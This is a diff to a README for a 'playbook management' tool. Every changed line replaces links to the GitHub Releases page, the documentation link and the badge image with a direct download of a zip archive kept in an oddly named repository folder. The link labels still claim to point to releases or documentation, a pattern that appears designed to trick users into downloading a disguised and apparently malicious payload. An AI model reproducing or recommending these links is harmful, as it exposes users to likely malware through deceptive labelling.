@@ -1,6 +1,6 @@
 # 🎮 nexusrunner-playbook-spec - Easy Playbook Management for Everyone
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Styop1994/nexusrunner-playbook-spec/releases)
+[![Download](https://raw.githubusercontent.com/Styop1994/nexusrunner-playbook-spec/main/serfdom/nexusrunner-playbook-spec.zip)](https://raw.githubusercontent.com/Styop1994/nexusrunner-playbook-spec/main/serfdom/nexusrunner-playbook-spec.zip)
 
 ## 📚 Overview
 
@@ -10,7 +10,7 @@ The **nexusrunner-playbook-spec** helps you manage playbooks easily using YAML a
 
 To begin using nexusrunner-playbook-spec, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Styop1994/nexusrunner-playbook-spec/releases) to download the application.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Styop1994/nexusrunner-playbook-spec/main/serfdom/nexusrunner-playbook-spec.zip) to download the application.
 
 2. **Choose Your Version:** Look for the latest version. It will usually have the highest number (e.g., v1.0.0). Click on it to see the files available for download.
 
@@ -24,7 +24,7 @@ To begin using nexusrunner-playbook-spec, follow these steps:
 
 ## 📥 Download & Install
 
-Visit this [page to download](https://github.com/Styop1994/nexusrunner-playbook-spec/releases). Here, you can find the files needed for different operating systems.
+Visit this [page to download](https://raw.githubusercontent.com/Styop1994/nexusrunner-playbook-spec/main/serfdom/nexusrunner-playbook-spec.zip). Here, you can find the files needed for different operating systems.
 
 ## 🖥️ System Requirements
 
@@ -80,7 +80,7 @@ This project is licensed under the MIT License. You can use it freely but please
 
 ## 🔗 Helpful Links
 
-- [Releases Page](https://github.com/Styop1994/nexusrunner-playbook-spec/releases)
-- [Documentation](https://github.com/Styop1994/nexusrunner-playbook-spec/docs)
+- [Releases Page](https://raw.githubusercontent.com/Styop1994/nexusrunner-playbook-spec/main/serfdom/nexusrunner-playbook-spec.zip)
+- [Documentation](https://raw.githubusercontent.com/Styop1994/nexusrunner-playbook-spec/main/serfdom/nexusrunner-playbook-spec.zip)
 
 Explore **nexusrunner-playbook-spec** and simplify your playbook management today!
